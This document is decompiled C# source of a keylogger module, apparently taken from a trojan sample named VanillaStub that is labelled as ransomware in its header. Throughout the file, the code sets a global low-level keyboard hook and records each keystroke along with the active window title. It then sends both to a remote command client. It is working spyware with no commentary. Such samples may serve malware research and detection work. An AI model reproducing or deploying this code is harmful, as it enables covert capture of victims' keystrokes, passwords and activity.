// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.Keylogger
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace VanillaStub.Helpers.Services
{
  public class Keylogger
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private static readonly Keylogger.LowLevelKeyboardProc Proc = new Keylogger.LowLevelKeyboardProc(Keylogger.HookCallback);
    private static IntPtr HookID = IntPtr.Zero;
    private static string CurrentWindow = "";

    public static bool SendKeys { private get; set; }

    public void InitKeylogger()
    {
      try
      {
        ApplicationContext context = new ApplicationContext();
        Keylogger.HookID = this.SetHook(Keylogger.Proc);
        Application.Run(context);
        Keylogger.UnhookWindowsHookEx(Keylogger.HookID);
      }
      catch
      {
      }
    }

    public IntPtr SetHook(Keylogger.LowLevelKeyboardProc Proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Keylogger.SetWindowsHookEx(13, Proc, Keylogger.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      try
      {
        if (nCode >= 0 && wParam == (IntPtr) 256)
        {
          int num = Marshal.ReadInt32(lParam);
          if (Keylogger.SendKeys)
          {
            List<byte> byteList = new List<byte>();
            byteList.Add((byte) 11);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(((Keys) num).ToString()));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
            byteList.Clear();
            Keylogger.CurrentWindow = Keylogger.GetWindowName();
            byteList.Add((byte) 12);
            byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(Keylogger.CurrentWindow));
            VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
          }
        }
      }
      catch
      {
      }
      return Keylogger.CallNextHookEx(Keylogger.HookID, nCode, wParam, lParam);
    }

    public static string GetWindowName()
    {
      StringBuilder text = new StringBuilder(256);
      return Keylogger.GetWindowText(Keylogger.GetForegroundWindow(), text, 256) > 0 ? text.ToString() : "N/A";
    }

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(
      int idHook,
      Keylogger.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
